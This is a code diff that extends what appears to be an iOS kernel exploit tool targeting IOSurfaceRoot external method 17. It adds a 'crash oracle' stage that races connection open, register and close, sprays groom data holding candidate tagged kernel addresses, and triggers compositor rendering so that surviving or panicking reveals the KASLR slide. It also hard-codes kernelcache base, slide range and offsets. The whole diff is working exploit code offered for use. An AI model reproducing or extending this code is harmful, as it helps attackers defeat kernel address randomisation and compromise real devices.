@@ -21283,6 +21283,346 @@ new_modes:
 
                 rlog("  === r=178 total kernel pointers: %d ===\n", r178_kptrs);
                 rlog("=== r=178 complete ===\n");
+
+            } else if (rounds >= 179 && rounds <= 189) {
+                /*
+                 * CRASH ORACLE KASLR probe.
+                 *
+                 * Put candidate kernel address in slot 2 (the deref field).
+                 * If the address is mapped & tagged correctly → survive.
+                 * If unmapped or tag mismatch → kernel panic → device reboots.
+                 *
+                 * Usage: iosurface_sel17 179 <hex_slide>
+                 *   e.g.: iosurface_sel17 179 3D540000
+                 *
+                 * Known constants:
+                 *   Unslid KC base = 0xFFFFFE0007004000
+                 *   Slide range: [0x2FAD0000, 0x4AFD4000] (16KB aligned)
+                 *   IOSurface kext offset from KC: 0x37A0800
+                 *
+                 * Tests the address: KC_base + provided_slide + 0x4000
+                 *   (+0x4000 to skip past the Mach-O header into __TEXT)
+                 *
+                 * Strategy: test multiple tag values (0x0 through 0xF)
+                 *   in a SINGLE iteration. First address that works =
+                 *   we found both the tag AND the slide is correct.
+                 *
+                 * rounds=179: test provided slide with tag sweep
+                 * rounds=180-184: reserved for sequential probes
+                 * rounds=185-189: test 5 evenly-spaced slides in one boot
+                 */
+                rlog("=== r=%d: CRASH ORACLE KASLR probe ===\n", rounds);
+
+                #define KC_UNSLID_BASE 0xFFFFFE0007004000ULL
+                #define KC_MIN_SLIDE   0x2FAD0000ULL
+                #define KC_MAX_SLIDE   0x4AFD4000ULL
+                #define KC_TEXT_OFF    0x4000ULL  /* skip Mach-O header */
+
+                uint64_t test_slide = 0;
+                int have_slide_arg = 0;
+
+                if (argc > 3) {
+                    /* Parse hex slide from argv[3] */
+                    const char *hex = argv[3];
+                    for (int h = 0; hex[h]; h++) {
+                        char c = hex[h];
+                        test_slide <<= 4;
+                        if (c >= '0' && c <= '9') test_slide |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') test_slide |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') test_slide |= (c - 'A' + 10);
+                    }
+                    have_slide_arg = 1;
+                    rlog("  Slide arg: 0x%llx\n", (unsigned long long)test_slide);
+                }
+
+                if (rounds == 179 && have_slide_arg) {
+                    /*
+                     * Single slide test with tag sweep.
+                     * Test tag=0xF first (most likely for kernel pointers),
+                     * then 0x0, then others.
+                     */
+                    uint64_t base_addr = (KC_UNSLID_BASE + test_slide + KC_TEXT_OFF)
+                                         & 0x00FFFFFFFFFFFFFFULL; /* strip existing tag */
+                    rlog("  Base addr (no tag): 0x%llx\n", (unsigned long long)base_addr);
+
+                    int tags_to_test[] = {0xF, 0x0, 0xE, 0x1, 0xD, 0x2};
+                    int ntags = 6;
+
+                    io_service_t orc_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
+                    if (!orc_svc) { rlog("  NO IOSurfaceRoot!\n"); goto phase17_done; }
+
+                    /* Pre-open groom connections */
+                    #define ORC_GROOM_N 128
+                    io_connect_t orc_gconns[ORC_GROOM_N];
+                    mach_port_t orc_gwps[ORC_GROOM_N];
+                    int orc_gn = 0;
+                    for (int g = 0; g < ORC_GROOM_N; g++) {
+                        io_connect_t gc = IO_OBJECT_NULL;
+                        if (IOServiceOpen(orc_svc, mach_task_self(), 0, &gc) == KERN_SUCCESS) {
+                            mach_port_t gwp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                            mach_port_insert_right(mach_task_self(), gwp, gwp,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            orc_gconns[orc_gn] = gc;
+                            orc_gwps[orc_gn] = gwp;
+                            orc_gn++;
+                        }
+                    }
+                    rlog("  Pre-opened %d groom conns\n", orc_gn);
+
+                    for (int ti = 0; ti < ntags; ti++) {
+                        uint64_t tag = (uint64_t)tags_to_test[ti];
+                        uint64_t tagged_addr = base_addr | (tag << 56);
+                        /* Preserve canonical upper bits for kernel VA */
+                        tagged_addr |= 0xFFFF000000000000ULL;
+                        /* Set bits[59:56] to our tag */
+                        tagged_addr = (tagged_addr & ~(0xFULL << 56)) | (tag << 56);
+                        /* Keep bits[63:60] = 0xF (canonical kernel) */
+                        tagged_addr |= (0xFULL << 60);
+
+                        uint64_t orc_gdata[3] = {0, 0, tagged_addr};
+                        rlog("\n  --- Tag test %d: tag=0x%X addr=0x%016llx ---\n",
+                             ti, tags_to_test[ti], (unsigned long long)tagged_addr);
+
+                        p16_groom_conns = orc_gconns;
+                        p16_groom_wps = orc_gwps;
+                        p16_groom_n = orc_gn;
+                        p16_groom_data = orc_gdata;
+
+                        /* Start groom spray */
+                        p16_groom_count = 0;
+                        p16_groom_run = 1;
+                        pthread_t orc_gths[4];
+                        for (int t = 0; t < 4; t++)
+                            pthread_create(&orc_gths[t], NULL, p16_groom_spray, NULL);
+                        usleep(1000);
+
+                        /* Race: open + register + close */
+                        uint64_t orc_inp[3] = {1, 2, 3};
+                        io_connect_t orc_cs[8];
+                        int orc_have[8];
+                        for (int i = 0; i < 8; i++) {
+                            orc_have[i] = (IOServiceOpen(orc_svc, mach_task_self(), 0,
+                                &orc_cs[i]) == KERN_SUCCESS);
+                            if (orc_have[i]) {
+                                mach_port_t twp = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                                mach_port_insert_right(mach_task_self(), twp, twp,
+                                    MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t ref = 0x1122334455667788ULL;
+                                IOConnectCallAsyncMethod(orc_cs[i], 17, twp, &ref, 1,
+                                    NULL, 0, orc_inp, 24, NULL, NULL, NULL, NULL);
+                                mach_port_deallocate(mach_task_self(), twp);
+                            } else orc_cs[i] = IO_OBJECT_NULL;
+                        }
+
+                        p13_spam_run = 1;
+                        p13_spam_conn = orc_have[0] ? orc_cs[0] : IO_OBJECT_NULL;
+                        p13_spam_shape = 1;
+                        p13_spam_count = 0;
+                        pthread_t orc_spam[16];
+                        for (int t = 0; t < 16; t++)
+                            pthread_create(&orc_spam[t], NULL, p13_spam_reg, NULL);
+
+                        for (int i = 7; i >= 0; i--) {
+                            if (orc_have[i]) { IOServiceClose(orc_cs[i]); orc_have[i] = 0; }
+                            usleep(100);
+                        }
+                        p13_spam_run = 0;
+                        for (int t = 0; t < 16; t++) pthread_join(orc_spam[t], NULL);
+                        for (int i = 0; i < 8; i++) if (orc_have[i]) IOServiceClose(orc_cs[i]);
+                        usleep(2000);
+
+                        p16_groom_run = 0;
+                        for (int t = 0; t < 4; t++) pthread_join(orc_gths[t], NULL);
+
+                        rlog("  race done, groom=%llu\n",
+                             (unsigned long long)p16_groom_count);
+
+                        /* Start render — this is the moment of truth.
+                         * GPU compositor walks the registry and dereferences slot 2.
+                         * If tagged_addr is valid → survive.
+                         * If invalid → kernel panic. */
+                        p13_render_run = 1;
+                        p13_render_frames = 0;
+                        pthread_t orc_render;
+                        pthread_create(&orc_render, NULL, p13_render_loop, NULL);
+                        usleep(300000); /* 300ms — enough for many compositor walks */
+                        p13_render_run = 0;
+                        pthread_join(orc_render, NULL);
+
+                        rlog("  *** SURVIVED tag=0x%X addr=0x%016llx frames=%d ***\n",
+                             tags_to_test[ti], (unsigned long long)tagged_addr,
+                             p13_render_frames);
+                        rlog("  KASLR_HIT: slide=0x%llx tag=0x%X\n",
+                             (unsigned long long)test_slide, tags_to_test[ti]);
+                        /* If we get here, this tag+slide works!
+                         * Stop testing more tags. */
+                        break;
+                    }
+
+                    /* Cleanup groom connections */
+                    for (int g = 0; g < orc_gn; g++) {
+                        IOServiceClose(orc_gconns[g]);
+                        mach_port_deallocate(mach_task_self(), orc_gwps[g]);
+                    }
+                    IOObjectRelease(orc_svc);
+
+                } else if (rounds == 185) {
+                    /*
+                     * Multi-probe: test 5 evenly-spaced slides.
+                     * Start with NULL (safe baseline), then test real addresses.
+                     * On first crash, the surviving tests tell us which region.
+                     */
+                    rlog("  Multi-probe: 5 slides across range\n");
+                    uint64_t step = (KC_MAX_SLIDE - KC_MIN_SLIDE) / 6;
+                    uint64_t probes[5];
+                    for (int p = 0; p < 5; p++) {
+                        probes[p] = KC_MIN_SLIDE + step * (p + 1);
+                        probes[p] &= ~0x3FFFULL; /* 16KB align */
+                    }
+
+                    io_service_t mp_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
+                    if (!mp_svc) { rlog("  NO IOSurfaceRoot!\n"); goto phase17_done; }
+
+                    /* Pre-open groom conns once */
+                    io_connect_t mp_gconns[ORC_GROOM_N];
+                    mach_port_t mp_gwps[ORC_GROOM_N];
+                    int mp_gn = 0;
+                    for (int g = 0; g < ORC_GROOM_N; g++) {
+                        io_connect_t gc = IO_OBJECT_NULL;
+                        if (IOServiceOpen(mp_svc, mach_task_self(), 0, &gc) == KERN_SUCCESS) {
+                            mach_port_t gwp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                            mach_port_insert_right(mach_task_self(), gwp, gwp,
+                                MACH_MSG_TYPE_MAKE_SEND);
+                            mp_gconns[mp_gn] = gc;
+                            mp_gwps[mp_gn] = gwp;
+                            mp_gn++;
+                        }
+                    }
+                    rlog("  Pre-opened %d groom conns\n", mp_gn);
+
+                    /* First: baseline with NULL (slot2=0) → must survive */
+                    {
+                        uint64_t safe[3] = {0, 0, 0};
+                        p16_groom_conns = mp_gconns;
+                        p16_groom_wps = mp_gwps;
+                        p16_groom_n = mp_gn;
+                        p16_groom_data = safe;
+
+                        p16_groom_count = 0;
+                        p16_groom_run = 1;
+                        pthread_t bths[4];
+                        for (int t = 0; t < 4; t++)
+                            pthread_create(&bths[t], NULL, p16_groom_spray, NULL);
+                        usleep(1000);
+
+                        uint64_t binp[3] = {1, 2, 3};
+                        io_connect_t bcs[4]; int bhave[4];
+                        for (int i = 0; i < 4; i++) {
+                            bhave[i] = (IOServiceOpen(mp_svc, mach_task_self(), 0,
+                                &bcs[i]) == KERN_SUCCESS);
+                            if (bhave[i]) {
+                                mach_port_t tw = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                                mach_port_insert_right(mach_task_self(), tw, tw,
+                                    MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t ref = 0xAA;
+                                IOConnectCallAsyncMethod(bcs[i], 17, tw, &ref, 1,
+                                    NULL, 0, binp, 24, NULL, NULL, NULL, NULL);
+                                mach_port_deallocate(mach_task_self(), tw);
+                            }
+                        }
+                        for (int i = 3; i >= 0; i--) {
+                            if (bhave[i]) IOServiceClose(bcs[i]);
+                        }
+                        usleep(2000);
+                        p16_groom_run = 0;
+                        for (int t = 0; t < 4; t++) pthread_join(bths[t], NULL);
+
+                        p13_render_run = 1;
+                        p13_render_frames = 0;
+                        pthread_t br;
+                        pthread_create(&br, NULL, p13_render_loop, NULL);
+                        usleep(200000);
+                        p13_render_run = 0;
+                        pthread_join(br, NULL);
+                        rlog("  Baseline NULL: SURVIVED frames=%d\n", p13_render_frames);
+                    }
+
+                    /* Now test each probe slide */
+                    for (int pi = 0; pi < 5; pi++) {
+                        uint64_t ps = probes[pi];
+                        /* Use tag=0xF (kernel pointer convention) */
+                        uint64_t paddr = KC_UNSLID_BASE + ps + KC_TEXT_OFF;
+
+                        uint64_t pdata[3] = {0, 0, paddr};
+                        rlog("\n  --- Probe %d: slide=0x%llx addr=0x%016llx ---\n",
+                             pi, (unsigned long long)ps, (unsigned long long)paddr);
+
+                        p16_groom_data = pdata;
+                        p16_groom_count = 0;
+                        p16_groom_run = 1;
+                        pthread_t pths[4];
+                        for (int t = 0; t < 4; t++)
+                            pthread_create(&pths[t], NULL, p16_groom_spray, NULL);
+                        usleep(1000);
+
+                        uint64_t pinp[3] = {1, 2, 3};
+                        io_connect_t pcs[4]; int phave[4];
+                        for (int i = 0; i < 4; i++) {
+                            phave[i] = (IOServiceOpen(mp_svc, mach_task_self(), 0,
+                                &pcs[i]) == KERN_SUCCESS);
+                            if (phave[i]) {
+                                mach_port_t tw = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                                mach_port_insert_right(mach_task_self(), tw, tw,
+                                    MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t ref = 0xBB;
+                                IOConnectCallAsyncMethod(pcs[i], 17, tw, &ref, 1,
+                                    NULL, 0, pinp, 24, NULL, NULL, NULL, NULL);
+                                mach_port_deallocate(mach_task_self(), tw);
+                            }
+                        }
+                        for (int i = 3; i >= 0; i--) {
+                            if (phave[i]) IOServiceClose(pcs[i]);
+                        }
+                        usleep(2000);
+                        p16_groom_run = 0;
+                        for (int t = 0; t < 4; t++) pthread_join(pths[t], NULL);
+
+                        rlog("  groom=%llu\n", (unsigned long long)p16_groom_count);
+
+                        /* Render — if this address is valid, we survive */
+                        p13_render_run = 1;
+                        p13_render_frames = 0;
+                        pthread_t pr;
+                        pthread_create(&pr, NULL, p13_render_loop, NULL);
+                        usleep(300000);
+                        p13_render_run = 0;
+                        pthread_join(pr, NULL);
+
+                        rlog("  *** PROBE %d SURVIVED: slide=0x%llx frames=%d ***\n",
+                             pi, (unsigned long long)ps, p13_render_frames);
+                        rlog("  KASLR_SURVIVE: probe=%d slide=0x%llx addr=0x%016llx\n",
+                             pi, (unsigned long long)ps, (unsigned long long)paddr);
+                    }
+
+                    for (int g = 0; g < mp_gn; g++) {
+                        IOServiceClose(mp_gconns[g]);
+                        mach_port_deallocate(mach_task_self(), mp_gwps[g]);
+                    }
+                    IOObjectRelease(mp_svc);
+                    rlog("=== r=%d: All probes survived! ===\n", rounds);
+
+                } else {
+                    rlog("  r=%d: no slide arg provided, use: iosurface_sel17 179 <hex_slide>\n",
+                         rounds);
+                }
+                rlog("=== r=%d complete ===\n", rounds);
             }
 
             IOServiceClose(conn17);
